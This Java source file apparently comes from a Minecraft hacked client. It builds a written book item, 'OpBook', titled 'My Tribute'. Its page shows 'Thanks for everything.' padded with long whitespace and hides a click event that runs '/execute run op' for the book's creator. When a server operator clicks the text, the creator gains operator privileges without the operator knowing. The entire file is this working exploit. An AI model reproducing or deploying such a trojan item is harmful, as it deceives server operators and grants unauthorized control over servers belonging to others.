package net.como.client.items;

import net.como.client.ComoClient;
import net.como.client.structures.CreativeItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;

public class OpBook implements CreativeItem {
    public OpBook() {
        super();
    }

    @Override
    public ItemStack getStack() {
        ItemStack item = new ItemStack(Items.WRITTEN_BOOK);

        String name = ComoClient.me().getName().asString();

        NbtCompound nbt = new NbtCompound();
        try {
            nbt = StringNbtReader.parse(
                "{author:\""+name+"\",pages:['{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/execute run op "+name+"\"},\"text\":\"Thanks for everything.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \"}','{\"text\":\"\"}','{\"text\":\"\"}'],resolved:1b,title:\"My Tribute\"}"
            );
        } catch (Exception e) {}

        item.setNbt(nbt);
        return item;
    }
    
    @Override
    public boolean useName() {
        return false;
    }
}
